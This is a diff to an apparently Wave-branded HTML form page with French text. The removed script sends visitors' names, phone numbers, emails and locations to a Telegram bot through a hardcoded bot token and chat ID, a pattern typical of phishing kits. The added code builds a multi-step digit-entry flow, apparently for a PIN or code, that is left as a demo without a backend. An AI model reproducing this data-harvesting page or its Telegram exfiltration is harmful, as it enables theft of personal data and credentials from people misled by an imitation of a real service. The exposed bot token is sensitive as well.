@@ -154,55 +154,25 @@
   </div>
 
 <script>
-  function // ===== CONFIGURATION TELEGRAM =====
-const BOT_TOKEN = "8923372171:AAH60PG4woDX9kR3CpD6IIIY4oWnUbDm6-c";   // ex: "7123456789:AAHxxxxxxxxxxxxxxxxxxxxxxx"
-const CHAT_ID   = "8675191556";     // ex: "123456789"
-
-document.getElementById("waveForm").addEventListener("submit", async (e) => {
-  e.preventDefault();
-  const form = e.target;
-  const btn = document.getElementById("submitBtn");
-  const status = document.getElementById("formStatus");
-  const data = new FormData(form);
-
-  const text =
-    "🌊 NOUVELLE INSCRIPTION WAVE\n" +
-    "━━━━━━━━━━━━━━━━━━━\n" +
-    "👤 Nom : " + data.get("nom") + "\n" +
-    "📞 Téléphone : " + data.get("telephone") + "\n" +
-    "📧 Email : " + data.get("email") + "\n" +
-    "📍 Ville/Pays : " + data.get("ville") + "\n" +
-    "💬 Message : " + (data.get("message") || "—") + "\n" +
-    "🕒 Date : " + new Date().toLocaleString("fr-FR");
-
-  btn.disabled = true;
-  btn.textContent = "Envoi en cours...";
-  status.textContent = "";
-  status.style.color = "#fff";
-
-  try {
-    const res = await fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id: CHAT_ID, text: text })
-    });
-    const result = await res.json();
-    if (result.ok) {
-      status.textContent = "✅ Merci ! Tes informations ont bien été envoyées.";
-      status.style.color = "#d4fff0";
-      form.reset();
-    } else {
-      throw new Error(result.description);
+  function goStep(n) {
+    for (let i = 1; i <= 3; i++) {
+      document.getElementById('screen' + i).classList.toggle('visible', i === n);
+      document.getElementById('s' + i).classList.toggle('active', i <= n);
     }
-  } catch (err) {
-    status.textContent = "❌ Erreur lors de l'envoi. Vérifie le token/chat_id.";
-    status.style.color = "#ffd6d6";
-  } finally {
-    btn.disabled = false;
-    btn.textContent = "Envoyer mes informations";
+    const input = document.querySelector('#screen' + n + ' input');
+    if (input) input.focus();
   }
-});
-</script>
 
+  function moveNext(el) {
+    el.value = el.value.replace(/\D/g, '');
+    if (el.value.length === 1 && el.nextElementSibling) {
+      el.nextElementSibling.focus();
+    }
+  }
+
+  function finish() {
+    alert('Démo : connexion validée ! Connecte ça à ton backend.');
+  }
+</script>
 </body>
 </html>
